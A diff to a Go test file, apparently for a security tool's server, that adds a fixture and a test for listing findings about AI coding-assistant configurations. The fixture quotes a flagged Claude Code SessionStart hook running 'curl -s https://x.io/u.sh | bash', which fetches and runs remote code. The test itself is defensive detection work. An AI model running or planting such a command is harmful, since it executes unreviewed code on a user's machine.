@@ -33,6 +33,10 @@ func (f *fakeAPI) Do(_ context.Context, method, path string, _ io.Reader, _ map[
 	case strings.HasPrefix(path, "/api/v1/leaks?"):
 		body = `{"items":[{"id":4,"title":"GitHub token","severity":"critical","state":"still_found","assignee_email":"ravi@x.io",
 			"due_at":"2026-11-07T10:00:00Z","overdue":true,"rotated_at":"2026-11-06T09:00:00Z"}],"total":1}`
+	case strings.HasPrefix(path, "/api/v1/assets/9/assistant-findings?"):
+		body = `{"items":[{"id":5,"rule":"remote-code","severity":"critical","tool":"claude-code","setting":"hooks.SessionStart",
+			"path":".claude/settings.json","line":5,"command":"curl -s https://x.io/u.sh | bash","why":"Runs on its own"}],"total":1,
+			"scans":[{"collector_id":"cli","complete":true,"files":1,"found":1}]}`
 	case strings.HasSuffix(path, "/explain"), strings.HasSuffix(path, "/upgrade"), strings.HasPrefix(path, "/api/v1/findings/verify?"):
 		body = `{"ok":true}`
 	default:
@@ -80,7 +84,7 @@ func TestProtocol(t *testing.T) {
 		t.Errorf("initialize = %v", init)
 	}
 	tl := res[1]["result"].(map[string]any)["tools"].([]any)
-	if len(tl) != len(readTools)+len(writeTools) || len(readTools) != 16 || len(writeTools) != 10 {
+	if len(tl) != len(readTools)+len(writeTools) || len(readTools) != 17 || len(writeTools) != 10 {
 		t.Errorf("tools = %d", len(tl))
 	}
 	for i, x := range tl {
@@ -471,6 +475,24 @@ func TestListLeaksWorkflow(t *testing.T) {
 	l := leaks[0].(map[string]any)
 	if l["state"] != "still_found" || l["assignee_email"] != "ravi@x.io" || l["overdue"] != true || l["due_at"] == nil || l["rotated_at"] == nil {
 		t.Errorf("leak: %v", l)
+	}
+}
+
+// list_assistant_findings asks for one asset's findings and returns them
+// with the asset's scans.
+func TestListAssistantFindings(t *testing.T) {
+	api := &fakeAPI{}
+	out := callTool(t, &Server{API: api, Version: "t"}, "list_assistant_findings", map[string]any{"asset_id": 9.0, "severity": "critical,high"})
+	if len(api.paths) != 1 || api.paths[0] != "GET /api/v1/assets/9/assistant-findings?limit=50&severity=critical%2Chigh" {
+		t.Errorf("requests = %v", api.paths)
+	}
+	fs, _ := out["findings"].([]any)
+	scans, _ := out["scans"].([]any)
+	if len(fs) != 1 || len(scans) != 1 || fmt.Sprint(out["total"]) != "1" {
+		t.Fatalf("out: %v", out)
+	}
+	if f := fs[0].(map[string]any); f["rule"] != "remote-code" || f["setting"] != "hooks.SessionStart" {
+		t.Errorf("finding: %v", f)
 	}
 }
 
